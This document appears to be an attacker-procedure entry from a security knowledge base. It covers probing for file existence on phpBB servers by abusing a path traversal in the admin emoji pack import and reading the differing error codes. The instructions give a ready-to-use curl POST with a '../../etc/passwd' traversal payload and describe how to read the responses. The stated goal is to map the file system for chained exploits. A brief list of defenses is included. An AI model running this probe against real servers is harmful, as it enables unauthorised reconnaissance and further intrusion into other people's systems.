---
tags:
  - path-traversal
  - file-discovery
type: procedure
tools:
  - '[[tools/Browser-Chrome]]'
tactics:
  - '[[Discovery]]'
commands:
  - '[[commands/phpbb-import-emoji-dos]]'
verified: false
platforms:
  - Web
  - Linux
submitted: true
techniques:
  - '[[File and Directory Discovery]]'
skill_level: intermediate
impact_level: low
detection_risk: medium
sub_techniques: []
id: 40038569-e9b6-4b48-ad2c-1e44bd7fc471
created_at: '2025-12-14T17:26:55.720Z'
updated_at: '2025-12-14T17:26:55.720Z'
validated: true
mitre_tactics:
  - '[[Discovery]]'
mitre_techniques:
  - '[[File and Directory Discovery]]'
---
# Probe-File-Existence-via-Error-Messages-in-phpBB

## Summary

This procedure uses the path traversal in phpBB's emoji import to probe for file existence by differentiating error messages: PAK_FILE_NOT_READABLE for non-existent files vs. WRONG_PAK_TYPE for invalid formats.

## Description

An authenticated attacker can send multiple import requests with traversed paths to various server files. The unsanitized 'pak' parameter allows observation of response differences, enabling reconnaissance of the server's file system without full reads. This aids in identifying targets for further exploitation like DoS or XSS chaining.

## Requirements

1. Authenticated admin session
2. Valid form_token and creation_time
3. HTTP client for sending requests

## Defense

Defensive measures and detection strategies:

- Normalize error messages to avoid information leakage
- Log and alert on repeated import failures with suspicious paths
- Restrict admin actions to known file paths only

## Objectives

1. Identify existent files on the server
2. Map file system structure for targeted attacks
3. Support chaining to other exploits

## Instructions

### Step 1: Craft Probing Requests

**Context**: Prepare POST requests with different traversed paths.

**Command** (Manual via Browser):

Use dev tools in [[tools/Browser-Chrome]] to modify and send import forms.

> Expected output: Collect paths to test.

### Step 2: Send and Analyze Responses

**Context**: Submit imports and check error codes.

**Command** ([[commands/phpbb-import-emoji-dos]] adapted for probe):
```bash
curl -X POST "http://target:8082/adm/index.php?i=acp_icons&mode=smilies&current=delete" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data "action=import&pak=../../../../../../../../../etc/passwd&form_token=TOKEN&creation_time=TIMESTAMP"
```

> Vary 'pak' paths. Expected output: PAK_FILE_NOT_READABLE if non-existent, WRONG_PAK_TYPE if readable but invalid.

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]] Discovery

### Techniques

- [[File and Directory Discovery]] File and Directory Discovery

### Sub-Techniques


## Commands Used

- [[commands/phpbb-import-emoji-dos]]

## Tools Used

- [[tools/Browser-Chrome]]

## Tags

- [[path-traversal]]
- [[file-discovery]]
